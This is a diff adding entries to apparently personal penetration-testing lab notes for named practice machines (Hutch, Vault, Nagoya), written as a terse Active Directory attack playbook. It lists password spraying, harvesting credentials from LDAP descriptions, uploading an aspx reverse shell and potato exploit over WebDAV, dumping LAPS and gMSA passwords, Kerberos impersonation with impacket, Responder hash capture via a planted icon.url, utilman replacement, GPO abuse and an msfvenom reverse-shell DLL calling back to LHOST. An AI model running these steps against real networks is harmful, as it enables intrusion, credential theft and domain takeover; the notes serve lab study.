@@ -18,6 +18,10 @@
 1. Responder only works with HTTP On and 'http://{{LHOST}}' 
 2. Run ` Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword ` to check, then `Import-Module .\GMSAPassword.ps1` to dump 
 
+#### Hutch => DAV 
+1. Do ldapsearch + descriptions to get creds, then use `cadaver` to upload aspx, rev shell, potato into dav.  
+2. Alternatively, bloodhound shows ReadLAPSPassword so `nxc ldap {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} -M laps` 
+
 #### Nagoya => Fucking piece of shit ticket 
 1. Make users list from website, guess some passwords (eg Summer2023, Nagoya2023) and spray 
 2. In rpcclient, 'fiona' changes pw for 'svc_helpdesk', 'svc_helpdesk' changes pw for 'christopher'. 
@@ -32,6 +36,10 @@
 5. `impacket-getST -spn 'cifs/{{MACHINE_NAME}}.{{DOMAIN}}' -impersonate 'Administrator' '{{DOMAIN}}/attackersystem$:Summer2018!' -dc-ip {{DC_IP}}` 
 6. `export KRB5CCNAME=./{{KERBEROS_TICKET}}.ccache` 
 7. `impacket-psexec {{MACHINE_NAME}}.{{DOMAIN}}  -target-ip {{DC_IP}} -k -no-pass"` 
+
+#### Vault => Responder on icon.url 
+1. Put icon.url in writable smb, then let responder get hash. 
+2. Either replace utilman with cmd or abuse GenericWrite on Default Domain Policy then `gpupdate /force` 
 
 ==== 
 
@@ -67,3 +75,5 @@ SMB: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUj
 2. Run `dir -force` to see hidden files 
 3. User is in DnsAdmins group = use dnscmd.exe to inject msfvenom DLL 
 4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT=443 -f dll -o rev.dll` 
+
+
